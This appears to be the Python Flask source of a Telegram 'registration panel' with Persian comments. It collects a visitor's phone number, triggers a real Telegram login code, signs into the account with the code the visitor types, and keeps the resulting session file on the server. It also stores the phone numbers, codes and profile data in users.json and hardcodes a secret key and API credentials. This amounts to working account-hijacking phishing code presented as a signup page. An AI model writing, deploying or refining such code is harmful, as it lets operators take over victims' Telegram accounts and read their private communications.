"""
پنل ثبت‌نام - نسخه نهایی با asyncio درست
"""

import os
import json
import time
import asyncio
from flask import Flask, render_template, request, jsonify, session
from telethon import TelegramClient
from telethon.errors import FloodWaitError

app = Flask(__name__)
app.secret_key = 'mew_secret_key_2026'

# ========== تنظیمات ==========
API_ID = 17187664
API_HASH = 'd6eae2c921342bb71816a980dc11b9f5'
USERS_FILE = 'users.json'
SESSIONS_DIR = 'sessions/'
TEMP_SESSIONS = {}

# ========== مدیریت فایل‌ها ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_user_count():
    users = load_users()
    return len(users)

# ========== توابع asyncio ==========
async def send_code_async(phone):
    """ارسال کد به صورت async"""
    temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{int(time.time())}", API_ID, API_HASH)
    await temp_client.connect()
    await temp_client.send_code_request(phone)
    return temp_client

async def verify_code_async(temp_client, code):
    """تایید کد به صورت async"""
    await temp_client.sign_in(code=code)
    me = await temp_client.get_me()
    return me

async def disconnect_async(temp_client):
    """قطع اتصال کلاینت"""
    await temp_client.disconnect()

# ========== مسیرها ==========
@app.route('/')
def index():
    return render_template('register.html', user_count=get_user_count())

@app.route('/api/users/count')
def users_count():
    return jsonify({'count': get_user_count()})

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone', '').strip()
    
    if not phone.startswith('+') or not phone[1:].isdigit():
        return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
    
    try:
        # استفاده از asyncio.run() برای مدیریت حلقه
        temp_client = asyncio.run(send_code_async(phone))
        
        session_id = str(int(time.time()))
        TEMP_SESSIONS[session_id] = {
            'client': temp_client,
            'phone': phone,
            'timestamp': time.time()
        }
        
        session['temp_id'] = session_id
        session['phone'] = phone
        
        return jsonify({'success': True, 'message': f'✅ کد تایید به {phone} ارسال شد!'})
        
    except FloodWaitError as e:
        return jsonify({'success': False, 'message': f'⏳ صبر کنید {e.seconds} ثانیه!'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    code = request.form.get('code', '').strip()
    temp_id = session.get('temp_id')
    phone = session.get('phone')
    
    if not temp_id or temp_id not in TEMP_SESSIONS:
        return jsonify({'success': False, 'message': '❌ نشست منقضی شده! دوباره تلاش کنید.'})
    
    if not code.isdigit() or len(code) != 5:
        return jsonify({'success': False, 'message': '❌ کد باید ۵ رقم باشد!'})
    
    try:
        temp_data = TEMP_SESSIONS[temp_id]
        temp_client = temp_data['client']
        
        # استفاده از asyncio.run() برای مدیریت حلقه
        me = asyncio.run(verify_code_async(temp_client, code))
        
        users = load_users()
        user_id = str(int(time.time()))
        
        users[user_id] = {
            'phone': phone,
            'code': code,
            'status': 'pending',
            'registered_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'username': me.username,
            'first_name': me.first_name,
            'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
        }
        save_users(users)
        
        # بستن کلاینت
        asyncio.run(disconnect_async(temp_client))
        del TEMP_SESSIONS[temp_id]
        session.clear()
        
        return jsonify({
            'success': True,
            'message': f'✅ ثبت‌نام موفق! خوش آمدی @{me.username}',
            'user': {
                'name': me.first_name,
                'username': me.username,
                'phone': phone
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})

# ========== اجرا ==========
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
